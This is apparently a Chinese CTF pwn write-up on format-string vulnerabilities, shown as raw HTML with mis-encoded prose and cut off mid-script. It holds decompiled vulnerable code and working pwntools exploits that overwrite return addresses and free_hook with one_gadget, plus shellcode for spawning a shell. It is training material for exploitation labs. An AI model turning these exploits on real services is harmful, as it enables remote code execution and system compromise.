class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">duan</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">x64_32 = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> x64_32:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./playfmt&#x27;</span>)</span><br><span class="line">buf=<span class="number">0x0804A060</span></span><br><span class="line">pre_ebp=<span class="number">0x080485AD</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span></span><br><span class="line"><span class="comment">#aaaa-0x8048680-0x4-0x8048507-0x8048685-0x804a000-0xffffce98-0x80485ad-0xf7fb5d60-0x804a000-0xffffcea8-0x80485ea-0xffffcec0-(nil)-(nil)-0xf7e1a647-0xf7fb5000-0xf7fb5000-(nil)</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;==\n&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;%6$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(r(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">0x28</span>+<span class="number">0x1c</span></span><br><span class="line">leak(<span class="string">&#x27;stack_addr:&#x27;</span>,stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(stack_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&#x27;c%6$hn&#x27;</span> </span><br><span class="line">pl = pl.ljust(<span class="number">200</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">s(pl)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment"># duan()</span></span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xa064</span>).encode() + <span class="string">b&#x27;c%10$hn&#x27;</span> </span><br><span class="line">pl = pl.ljust(<span class="number">200</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">s(pl)</span><br><span class="line">p.recv()</span><br><span class="line">duan()</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">pl = <span class="string">b&#x27;quit&#x27;</span> + shellcode</span><br><span class="line">s(pl)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h3 id="æ€è€ƒç‚¹"><a href="#æ€è€ƒç‚¹" class="headerlink" title="æ€è€ƒç‚¹"></a>æ€è€ƒç‚¹</h3><ul><li>printfçš„æ ˆå¸ƒå±€å—å†…æ ¸ç‰ˆæœ¬çš„å½±å“è€Œä¸å—libcç‰ˆæœ¬çš„å½±å“</li><li>ç”±äºæœ¬é¢˜æ²¡æœ‰æ ‡å¿—æ€§çš„è¾“å‡ºï¼Œå¯¼è‡´çš„expæ‰“å¾—ä¸ç¨³å®š</li><li>éæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´éœ€è¦ä¸¤æ¬¡é—´æ¥è¦†ç›–æ‰å¯ä»¥è¦†ç›–è¿”å›åœ°å€</li></ul><h1 id="easy-printf-64ä½"><a href="#easy-printf-64ä½" class="headerlink" title="easy_printf (64ä½)"></a>easy_printf (64ä½)</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s2; <span class="comment">// [rsp+8h] [rbp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know who the best pwner is?&quot;</span>);</span><br><span class="line">  base64_decode(encoded_string, &amp;s2);           <span class="comment">//VG9rYW1laW5FX2lzX3RoZV9iZXN0X3B3bmVy</span></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x3C</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, s2) )</span><br><span class="line">    vuln();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I think your idea is wrong&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(s2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ‰¾ä¸€ä¸ªåœ¨çº¿ç½‘ç«™è§£ä¸€ä¸‹base64ï¼Œç„¶åè¿›å…¥vuln</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Oh,you are right&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to this place&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fmtstr();</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">fmtstr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">12</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><p>æœ‰13æ¬¡çš„printf</p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>åˆ©ç”¨éæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥ä¿®æ”¹free_hookä¸ºone_gadget<br>__libc_start_main+240 ï¼šmainå‡½æ•°çš„è¿”å›åœ°å€</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051106456.png" alt="image-20240805101007065"><br>è¿™ä¸ªé¢˜é¦–å…ˆå°±æ˜¯è¿ç”¨rbpé™„è¿‘çš„ä¸¤ä¸ªè·³æ¿(åç§»ä¸º8å’Œ10)ï¼ŒæŠŠ_libc_start_main+240æ”¹æˆfree_hook<br>è¿™é‡Œéœ€è¦æ”¹6ä½ï¼Œæ‰€ä»¥éœ€è¦4æ­¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(num)+<span class="string">&#x27;c%8$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(free_hook&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%10$hn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(num+<span class="number">2</span>)+<span class="string">&#x27;c%8$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((free_hook//<span class="number">0x10000</span>)&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‰ä¸¤æ­¥ä¿®æ”¹å°±æ˜¯ç›´æ¥å¯¹ _libc_start_main+240 åä¸¤ä½è¿›è¡Œäº†ä¿®æ”¹<br>åä¸¤æ­¥æ˜¯å…ˆä¿®æ”¹äº†ä¸€ä¸‹åœ°å€ï¼Œç„¶åä¿®æ”¹äº† _libc_start_main+240 çš„å€’æ•°3ï¼Œ4ä½(å°±æ˜¯ä¸èƒ½ç›´æ¥ä¿®æ”¹åœ°å€çš„å€’æ•°3ï¼Œ4ä½ï¼Œæˆ‘ä»¬å°±ä¿®æ”¹åœ°å€ï¼Œç„¶åæ”¹æ–°åœ°å€çš„æœ€åä¸¤ä½ï¼Œä»¥è¾¾åˆ°ä¿®æ”¹åœ°å€çš„å€’æ•°3ï¼Œ4ä½çš„ç›®çš„)</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051106802.png" alt="image-20240805101050623"><br>ç„¶åå†ç”¨è·³æ¿æŠŠfree_hookæ”¹ä¸ºone_gadget<br>free_hook (0x7fde287987a8) ä¸ one_gadget (0x7fde2841727a) ä¹Ÿæ˜¯å6ä½æœ‰åŒºåˆ«ï¼Œæ‰€ä»¥éœ€è¦å¤šæ­¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(og&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%29$hn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(num)+<span class="string">&#x27;c%8$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xaa</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((og//<span class="number">0x10000</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%29$hn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xac</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(free&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%29$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xad</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(free1)+<span class="string">&#x27;c%29$hhn&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ­¥æ˜¯å…ˆç›´æ¥ä¿®æ”¹free_hookçš„åå››ä½ï¼Œç¬¬äºŒä¸‰æ­¥æ˜¯æŠŠ _libc_start_main+240 ä¿®æ”¹æˆäº† free_hook+2 (free_hookæœ€åä¸¤ä½æ˜¯0xa8 , 0xa8+0x2&#x3D;0xaa , è¿™ä¸ªåœ°å€æ˜¯ç”¨libcæŸ¥æ‰¾çš„ï¼Œæ‰€ä»¥æœ¬åœ°å’Œè¿œç¨‹åä¸‰ä½æ˜¯ä¸€è‡´çš„)ï¼Œç„¶åå†ç”¨è¿™ç§æ–¹æ³•ä¿®æ”¹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051106200.png" alt="image-20240805101101694"><br>è¿™é‡Œå†æ‰§è¡Œå®Œä¸Šé¢æœ€åä¸€æ­¥å°±å¯ä»¥ä¿®æ”¹å®Œäº†ï¼Œç„¶åæ‰§è¡Œfreeå‡½æ•°å°±ç›´æ¥getshelläº†ã€‚</p><p>ç”±äºæ‰¾ä¸åˆ°é¢˜ç›®ï¼Œå› æ­¤å¤§è‡´çœ‹äº†ä¸‹æ€è·¯ï¼Œä¹Ÿæ˜¯é€šè¿‡é—´æ¥è¦†ç›–åœ°å€</p><h1 id="äºŒè¿›åˆ¶ä¸“é¡¹-fooooood-64ä½"><a href="#äºŒè¿›åˆ¶ä¸“é¡¹-fooooood-64ä½" class="headerlink" title="äºŒè¿›åˆ¶ä¸“é¡¹ fooooood (64ä½)"></a>äºŒè¿›åˆ¶ä¸“é¡¹ fooooood (64ä½)</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  Init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Have you heard about YANGSHEN?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;YangShen said that he want to know your name.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your name:&quot;</span>);</span><br><span class="line">  getstring(name, <span class="number">32</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, name);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">3</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now, you have %d times to tell me what is your favourite food!\nwhat&#x27;s your favourite food: &quot;</span>, i);</span><br><span class="line">    getstring(food, <span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You like &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(food);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;!?\nI like it too!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">getstring</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )                    <span class="comment">// a2=32</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (i + a1), <span class="number">1uLL</span>);                    <span class="comment">// a1=name  bss</span></span><br><span class="line">    <span class="keyword">if</span> ( *(i + a1) == <span class="number">0xA</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‰æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p>åªæœ‰ä¸‰æ¬¡çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè€Œiçš„å€¼ä½äºæ ˆä¸Šï¼Œå› æ­¤å…ˆä¿®æ”¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æ¬¡æ•°ï¼Œå†è¦†ç›– <code>_libc_start_main+240</code>ä¸º <code>one_gadget</code>å³å¯</p><h1 id="2024DASCTF-springboard"><a href="#2024DASCTF-springboard" class="headerlink" title="2024DASCTF springboard"></a>2024DASCTF springboard</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="built_in">void</span> (__fastcall *)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">char</span> **))myinit)(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Life is not boring, dreams are not out of reach.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Sometimes you just need a springboard.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Then you can see a wider world.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There may be setbacks along the way.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But keep your love of life alive.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I believe that you will succeed.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good luck.&quot;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Here&#x27;s a simple pwn question, challenge yourself.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have an 5 chances to get a flag&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is the %d time\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter a keyword&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, bss, <span class="number">0x40</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(bss);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5æ¬¡çš„éæ ˆä¸Šprintfï¼Œæ˜¯æé™æƒ…å†µï¼Œæ”¹ <code>_libc_start_main+240</code>ä¸º<code>one_gadget</code>å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> s,n     :<span class="built_in">print</span>(<span class="string">&quot;\033[31m[&quot;</span>+s+<span class="string">&quot; -&gt; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(n))+<span class="string">&quot;]\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28282</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, execute=duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"><span 